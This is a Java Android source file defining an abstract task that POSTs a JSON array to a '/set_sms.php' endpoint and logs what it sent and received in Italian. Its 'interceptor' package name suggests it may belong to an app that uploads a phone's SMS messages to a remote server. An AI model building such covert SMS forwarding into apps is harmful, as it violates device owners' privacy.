package org.darkdefender.interceptor.tasks;

import org.darkdefender.interceptor.exceptions.CustomNetworkException;
import org.darkdefender.interceptor.utils.Net;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.util.Log;

public abstract class SetSmsTask extends GenericJSONAsyncTask {

	Context ctx;
	String path = "/set_sms.php";
	
	public SetSmsTask(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	protected Boolean sendRequest() {
		String response;
		try {
			JSONArray send = getArrayParams();
			Log.w("Ho inviato:", send.toString());
			response = Net.makeHTTPPostRequest(ctx, getEndPointPath()+path, send);
			Log.w("Ho ricevuto:", response);
			JSONObject json_resp = new JSONObject(response);
			if(json_resp.getString("response").equalsIgnoreCase("ERROR")){
				return false;
			}
		} catch (CustomNetworkException e) {
			e.printStackTrace();
			return false;
		} catch (JSONException e) {
			e.printStackTrace();
			return false;
		}
		
		return true;
	}
	
}
